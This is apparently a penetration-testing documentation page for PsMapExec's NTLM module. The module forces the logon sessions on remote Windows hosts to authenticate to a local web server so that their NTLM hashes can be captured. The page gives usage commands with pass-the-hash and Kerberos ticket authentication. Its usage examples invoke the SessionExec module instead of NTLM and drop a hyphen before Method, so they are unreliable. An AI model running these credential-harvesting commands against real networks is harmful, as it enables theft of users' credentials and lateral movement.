# NTLM

{% hint style="warning" %}
Does not currently working against Windows Server 2008 / Windows 7 / Windows Server 2012&#x20;
{% endhint %}

This module builds upon the [SessionExec](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/sessionexec) module. Whereby, execution on a remote host will force each user logon session to authenticate to a locally hosted web sever and obtain the users NTLMv1 or NTLMv2 hash.

This modules code is based on a fork of [Get-NetNTLM](https://github.com/The-Viper-One/Get-NetNTLM).

{% hint style="info" %}
If you wish to relay hashes or capture them with Inveigh or Responder, instead use the [SessionRelay](https://viperone.gitbook.io/pentest-everything/psmapexec/modules/sessionrelay) module.
{% endhint %}

For example, assuming the below output. We can see the remote host currently has the users standarduser and srv2019-admin within existing logon sessions. PsMapExec will attempt to obtain each users NTLMv1 or NTLMv2 hash.

```
C:\Users\SRV2019-Admin>quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 standarduser                              1  Disc            7  04/08/2024 17:14
 srv2019-admin         console             2  Active      none   04/08/2024 17:18
```

Output for  NTLM is stored `$PWD\PME\NTLM\`

### **Supported Methods** <a href="#supported-methods" id="supported-methods"></a>

* SMB
* SessionHunter (WMI)
* WMI
* WinRM

### Optional Parameters <a href="#optional-parameters" id="optional-parameters"></a>

| Parameter    | Value | Description                                 |
| ------------ | ----- | ------------------------------------------- |
| -ShowOutput  | N/A   | Displays each targets output to the console |
| -SuccessOnly | N/A   | Display only successful results             |

## Usage <a href="#usage" id="usage"></a>

{% code overflow="wrap" %}
```powershell
# SMB execution with password authentication, targeting workstations
PsMapExec -Module SessionExec -Targets "Workstations" Method "SMB" -Username [User] -Password [Pass] -Command "whoami /all"

# WinRM execution with hash authentication, targeting servers
PsMapExec -Module SessionExec -Targets "Servers" -Username [User] -Hash [RC4/AES256/NTLM]  -Method "WinRM" -Command "whoami /all"

# WMI execution with Kerberos ticket authentication (Username not required)
PsMapExec -Module SessionExec -Targets "All" -Method "WMI" -Ticket [doI..] 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2166).png" alt=""><figcaption></figcaption></figure>
